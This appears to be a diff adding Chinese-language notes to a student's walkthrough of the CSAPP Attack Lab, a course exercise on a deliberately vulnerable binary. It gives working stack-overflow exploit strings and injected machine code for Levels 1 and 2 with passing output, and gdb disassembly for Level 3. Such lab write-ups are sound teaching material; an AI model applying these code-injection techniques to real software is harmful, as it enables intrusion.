@@ -328,5 +328,153 @@ PASS: Would have posted the following:
         course  15213-f15
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:1:41 41 41 42 41 41 43 41 41 44 41 41 45 41 41 46 41 41 47 41 41 48 41 41 49 41 41 4A 41 41 4B 41 41 4C 41 41 4D 41 41 4E C0 17 40 00
+
+~/new_space/CSAPP_Lab/Attack/target1 (master*) » bat exploit.txt                                    czy@czy-307-thinkcentre-m720q-n000
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: exploit.txt
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 41 41 41 42 41 41 43 41 41 44 41 41 45 41 41 46 41 41 47 41 41 48 41 41 49 41 41 4A 41 41 4B 41 41 4C 41 41 4D 41 41 4E C0 17 
+       │ 40 00 /* Level 1*/
+───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+---------------------------------------------------------------------------------------------------------------------------------------
+~/new_space/CSAPP_Lab/Attack/target1 (master) »          
 ~~~
 
+# Level 2
+~~~c
+1 void touch2(unsigned val)
+2 {
+3   vlevel = 2; /* 验证协议的一部分 */
+4   if (val == cookie) {
+5     printf("Touch2!：你调用了 touch2(0x%.8x)\n", val);
+6     validate(2);
+7   } else {
+8     printf("未命中：你调用了 touch2(0x%.8x)\n", val);
+9     fail(2);
+10  }
+11  exit(0);
+12 }
+~~~
+
+要完成这个任务，我们需要构造一个攻击字符串，该字符串在执行到 `getbuf` 函数的 `ret` 指令时，能够重定向执行流到 `touch2` 函数，并且看起来像是 `touch2` 被正确调用了，即携带了正确的参数（你的 cookie）。
+
+
+1. **找到 `touch2` 函数的地址**：首先，需要确定 `touch2` 函数的地址。这通常通过分析目标程序的符号表来完成。
+2. **构造攻击代码**：你需要编写一小段汇编代码，这段代码将你的 cookie 值放入 `rdi` 寄存器（在 x86-64 架构中，函数的第一个参数通过 `rdi` 传递），然后执行 `ret` 指令。这段代码将替代 `getbuf` 函数的返回地址。
+3. **确定缓冲区的大小和 `getbuf` 的返回地址**：你需要知道 `getbuf` 函数内部分配的缓冲区的大小，以及 `getbuf` 的返回地址在栈上的位置。这样，你就可以在缓冲区溢出时覆盖返回地址。
+4. **构造完整的攻击字符串**：攻击字符串将包含你的攻击代码、一些填充字节（如果需要的话），以及 `touch2` 函数的地址。这个字符串将覆盖 `getbuf` 的栈空间，使得 `ret` 指令将控制权转移到你的攻击代码，然后你的代码将进一步跳转到 `touch2`。
+
+这个过程的具体实现依赖于目标程序的具体内存布局和函数调用约定。以下是一个大致的攻击代码示例，假设你已经知道了 `touch2` 的地址和所需的 cookie 值：
+
+```asm
+movq $0x59b997fa, %rdi  
+pushq $0x4017ec  
+ret                        
+```
+
+将上述汇编代码转换为机器码，并构造出完整的攻击字符串。这个字符串首先包含一些填充字节（如果需要），然后是上述机器码，最后是 `getbuf` 函数返回地址处的 `touch2` 函数地址。攻击字符串的确切构造取决于栈的布局和缓冲区的大小。
+
+
+*[master][~/new_space/CSAPP_Lab/Attack/target1]$ cat exploit.txt | ./hex2raw | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 93 DC 61 55 
+*[master][~/new_space/CSAPP_Lab/Attack/target1]$ bat exploit.txt 
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: exploit.txt
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1 ~ │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+   2 ~ │ 48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */
+   3 ~ │ 68 ec 17 40 00          /* pushq  $0x4017ec */
+   4 ~ │ c3                      /* retq */
+   5 ~ │ 93 DC 61 55             
+───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+*[master][~/new_space/CSAPP_Lab/Attack/target1]$ 
+
+
+# Level 3
+~~~shell
+gef➤  disas touch3
+Dump of assembler code for function touch3:
+   0x00000000004018fa <+0>:     push   rbx
+   0x00000000004018fb <+1>:     mov    rbx,rdi
+   0x00000000004018fe <+4>:     mov    DWORD PTR [rip+0x202bd4],0x3        # 0x6044dc <vlevel>
+   0x0000000000401908 <+14>:    mov    rsi,rdi
+   0x000000000040190b <+17>:    mov    edi,DWORD PTR [rip+0x202bd3]        # 0x6044e4 <cookie>
+   0x0000000000401911 <+23>:    call   0x40184c <hexmatch>
+   0x0000000000401916 <+28>:    test   eax,eax
+   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
+   0x000000000040191a <+32>:    mov    rdx,rbx
+   0x000000000040191d <+35>:    mov    esi,0x403138
+   0x0000000000401922 <+40>:    mov    edi,0x1
+   0x0000000000401927 <+45>:    mov    eax,0x0
+   0x000000000040192c <+50>:    call   0x400df0 <__printf_chk@plt>
+   0x0000000000401931 <+55>:    mov    edi,0x3
+   0x0000000000401936 <+60>:    call   0x401c8d <validate>
+   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>
+   0x000000000040193d <+67>:    mov    rdx,rbx
+   0x0000000000401940 <+70>:    mov    esi,0x403160
+   0x0000000000401945 <+75>:    mov    edi,0x1
+   0x000000000040194a <+80>:    mov    eax,0x0
+   0x000000000040194f <+85>:    call   0x400df0 <__printf_chk@plt>
+   0x0000000000401954 <+90>:    mov    edi,0x3
+   0x0000000000401959 <+95>:    call   0x401d4f <fail>
+   0x000000000040195e <+100>:   mov    edi,0x0
+   0x0000000000401963 <+105>:   call   0x400e40 <exit@plt>
+End of assembler dump.
+
+gef➤  disas hexmatch
+Dump of assembler code for function hexmatch:
+   0x000000000040184c <+0>:     push   r12
+   0x000000000040184e <+2>:     push   rbp
+   0x000000000040184f <+3>:     push   rbx
+   0x0000000000401850 <+4>:     add    rsp,0xffffffffffffff80
+   0x0000000000401854 <+8>:     mov    r12d,edi
+   0x0000000000401857 <+11>:    mov    rbp,rsi
+   0x000000000040185a <+14>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000401863 <+23>:    mov    QWORD PTR [rsp+0x78],rax
+   0x0000000000401868 <+28>:    xor    eax,eax
+   0x000000000040186a <+30>:    call   0x400db0 <random@plt>
+   0x000000000040186f <+35>:    mov    rcx,rax
+   0x0000000000401872 <+38>:    movabs rdx,0xa3d70a3d70a3d70b
+   0x000000000040187c <+48>:    imul   rdx
+   0x000000000040187f <+51>:    add    rdx,rcx
+   0x0000000000401882 <+54>:    sar    rdx,0x6
+   0x0000000000401886 <+58>:    mov    rax,rcx
+   0x0000000000401889 <+61>:    sar    rax,0x3f
+   0x000000000040188d <+65>:    sub    rdx,rax
+   0x0000000000401890 <+68>:    lea    rax,[rdx+rdx*4]
+   0x0000000000401894 <+72>:    lea    rax,[rax+rax*4]
+   0x0000000000401898 <+76>:    shl    rax,0x2
+   0x000000000040189c <+80>:    sub    rcx,rax
+   0x000000000040189f <+83>:    lea    rbx,[rsp+rcx*1]
+   0x00000000004018a3 <+87>:    mov    r8d,r12d
+   0x00000000004018a6 <+90>:    mov    ecx,0x4030e2
+   0x00000000004018ab <+95>:    mov    rdx,0xffffffffffffffff
+   0x00000000004018b2 <+102>:   mov    esi,0x1
+   0x00000000004018b7 <+107>:   mov    rdi,rbx
+   0x00000000004018ba <+110>:   mov    eax,0x0
+   0x00000000004018bf <+115>:   call   0x400e70 <__sprintf_chk@plt>
+   0x00000000004018c4 <+120>:   mov    edx,0x9
+   0x00000000004018c9 <+125>:   mov    rsi,rbx
+   0x00000000004018cc <+128>:   mov    rdi,rbp
+   0x00000000004018cf <+131>:   call   0x400ca0 <strncmp@plt>
+   0x00000000004018d4 <+136>:   test   eax,eax
+   0x00000000004018d6 <+138>:   sete   al
+   0x00000000004018d9 <+141>:   movzx  eax,al
+   0x00000000004018dc <+144>:   mov    rsi,QWORD PTR [rsp+0x78]
+   0x00000000004018e1 <+149>:   xor    rsi,QWORD PTR fs:0x28
+   0x00000000004018ea <+158>:   je     0x4018f1 <hexmatch+165>
+   0x00000000004018ec <+160>:   call   0x400ce0 <__stack_chk_fail@plt>
+   0x00000000004018f1 <+165>:   sub    rsp,0xffffffffffffff80
+   0x00000000004018f5 <+169>:   pop    rbx
+   0x00000000004018f6 <+170>:   pop    rbp
+   0x00000000004018f7 <+171>:   pop    r12
+   0x00000000004018f9 <+173>:   ret    
+End of assembler dump.
+~~~
